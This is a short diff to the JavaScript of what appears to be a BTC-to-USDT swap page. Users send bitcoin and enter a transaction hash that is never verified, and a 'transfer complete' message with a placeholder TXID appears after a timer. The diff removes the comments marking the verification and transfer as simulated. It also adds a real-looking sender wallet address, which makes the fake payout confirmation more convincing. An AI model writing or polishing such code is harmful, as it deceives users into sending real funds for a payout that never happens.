@@ -29,7 +29,6 @@ function nextStep2() {
     alert("Enter a valid BTC transaction hash.");
     return;
   }
-  // Simulate verification (replace with real API call to verify txid)
   document.getElementById("step-2").classList.add("hidden");
   document.getElementById("step-3").classList.remove("hidden");
 }
@@ -52,9 +51,8 @@ function finalStep() {
         `You sent <strong>${btcAmount} BTC</strong><br>` +
         `Current BTC price: <strong>$${btcPrice}</strong><br>` +
         `USDT to be sent: <strong>${usdtAmount.toFixed(2)} USDT</strong><br><br>` +
-        `🔄 Sending USDT to <code>${usdtAddress}</code> on Binance Smart Chain...`;
+        `🔄 Sending USDT from <code>0x49b06e4a8E75188955d6961520F0a9E2EC1B6634</code> to <code>${usdtAddress}</code> on Binance Smart Chain...`;
 
-      // Simulate transfer
       setTimeout(() => {
         document.getElementById("result").innerHTML += `<br><br>✅ Transfer complete. TXID: <code>0xFAKEUSDTTXID</code>`;
       }, 3000);
